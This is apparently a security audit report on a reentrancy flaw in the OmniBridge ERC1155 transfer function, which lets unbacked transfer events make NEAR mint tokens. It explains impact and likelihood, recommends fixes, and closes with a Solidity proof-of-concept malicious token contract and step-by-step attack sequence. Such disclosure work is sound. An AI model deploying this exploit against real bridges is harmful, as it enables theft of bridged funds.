### Title
Reentrancy via Malicious ERC1155 Callback in `initTransfer1155` Enables Unauthorized Token Minting on NEAR — (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`initTransfer1155` in `OmniBridge.sol` makes an external call to `IERC1155.safeTransferFrom` before emitting the `InitTransfer` event and has no `nonReentrant` guard. A malicious ERC1155 token can reenter `initTransfer1155` during the `safeTransferFrom` execution, causing multiple `InitTransfer` events to be emitted with distinct nonces but without corresponding token deposits. The NEAR side treats each emitted event as proof that tokens are held by the bridge and mints the corresponding amount to the recipient, allowing an attacker to receive far more tokens on NEAR than they deposited on EVM.

---

### Finding Description

`initTransfer1155` follows this sequence:

1. Increment `currentOriginNonce` (state update — correct)
2. Call `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` — **external call to attacker-controlled contract**
3. Call `initTransferExtension(...)` — internal (or Wormhole publish in `OmniBridgeWormhole`)
4. `emit BridgeTypes.InitTransfer(...)` — event emission [1](#0-0) 

The ERC1155 `safeTransferFrom` standard requires the token contract to call `onERC1155Received` on the recipient, but a malicious ERC1155 implementation can instead call any arbitrary function — including `initTransfer1155` — on the bridge during its `safeTransferFrom` execution. The bridge's `onERC1155Received` guard only blocks direct ERC1155 sends (checking `operator != address(this)`); it does not prevent a reentrant call to `initTransfer1155` itself. [2](#0-1) 

Because `currentOriginNonce` is incremented at the top of each call, each reentrant invocation receives a fresh, unique nonce. The `InitTransfer` event is emitted at the bottom of each stack frame, so N reentrant calls produce N distinct `InitTransfer` events — each with a different `originNonce` and an arbitrary `amount` chosen by the malicious token — while the bridge may have received zero actual ERC1155 tokens.

The `logMetadata1155` function is fully permissionless, so any user can register a malicious ERC1155 token and trigger NEAR-side token deployment without admin involvement. [3](#0-2) 

The CLAUDE.md security invariant states: *"State before external calls: Always mutate state (e.g. mark nonce used) before any external call … This is the primary reentrancy defense."* Incrementing `currentOriginNonce` before the external call is insufficient here because the nonce increment does not prevent additional events from being emitted — it only ensures each reentrant call gets a distinct nonce, which the NEAR side treats as independent, valid transfers. [4](#0-3) 

The same vulnerability exists in `OmniBridgeWormhole`, where `initTransferExtension` publishes a Wormhole message after the `safeTransferFrom`, meaning each reentrant call also posts a Wormhole VAA that the NEAR side will accept. [5](#0-4) 

---

### Impact Explanation

The NEAR bridge invariant states: *"InitTransfer must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held."* [6](#0-5) 

A successful reentrancy attack breaks this invariant: N `InitTransfer` events are emitted but only 0 or 1 token deposits occur. The NEAR side processes each event via its light-client or Wormhole prover, verifies the on-chain event (which is real), and mints the full `amount` to the attacker's NEAR address for each event. This constitutes **unauthorized minting and theft of bridged funds** — a critical impact.

---

### Likelihood Explanation

The attack requires only:
1. Deploying a malicious ERC1155 contract (no special permissions)
2. Calling the permissionless `logMetadata1155` to register it
3. Waiting for NEAR to deploy the corresponding token (standard bridge flow)
4. Calling `initTransfer1155` with the malicious token

No admin access, private key compromise, or validator collusion is required. The entry point is a public, unprivileged function. Likelihood is **high**.

---

### Recommendation

1. Add OpenZeppelin's `ReentrancyGuardUpgradeable` and apply `nonReentrant` to `initTransfer1155` (and `initTransfer` for defense-in-depth).
2. Alternatively, restructure `initTransfer1155` to follow strict CEI: record the pre-call ERC1155 balance, perform the transfer, verify the post-call balance increased by `amount`, then emit the event.
3. Consider adding a registry check so only tokens registered via `logMetadata1155` can be used in `initTransfer1155`, reducing the attack surface to tokens the NEAR side has already deployed.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

interface IBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IBridge public bridge;
    uint256 public reentrancyCount;
    uint256 public constant MAX_REENTRIES = 5;
    uint256 public constant FAKE_AMOUNT = 1_000_000e18; // inflated amount

    constructor(address _bridge) {
        bridge = IBridge(_bridge);
    }

    // Called by bridge.initTransfer1155 → this.safeTransferFrom
    function safeTransferFrom(
        address, address, uint256 tokenId, uint256, bytes calldata
    ) external {
        if (reentrancyCount < MAX_REENTRIES) {
            reentrancyCount++;
            // Reenter with inflated amount; msg.sender here is the bridge
            bridge.initTransfer1155(
                address(this),
                tokenId,
                uint128(FAKE_AMOUNT),
                0,
                0,
                "attacker.near",
                ""
            );
        }
        // Never actually transfers tokens
    }

    // Minimal ERC1155 stubs to satisfy interface
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e30; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

// Attack:
// 1. Deploy MaliciousERC1155(bridgeAddress)
// 2. bridge.logMetadata1155(maliciousERC1155, tokenId)  ← permissionless
// 3. Wait for NEAR to deploy the token
// 4. bridge.initTransfer1155(maliciousERC1155, tokenId, 1, 0, 0, "attacker.near", "")
//    → 6 InitTransfer events emitted (1 real + 5 reentrant with FAKE_AMOUNT)
//    → NEAR mints 5 * FAKE_AMOUNT + 1 tokens to attacker.near
//    → Bridge holds 0 actual ERC1155 tokens
```

The `InitTransfer` events are real on-chain events. The NEAR light-client or Wormhole prover verifies them as valid and the NEAR bridge mints tokens for each, draining the NEAR-side token supply without any corresponding EVM-side collateral.
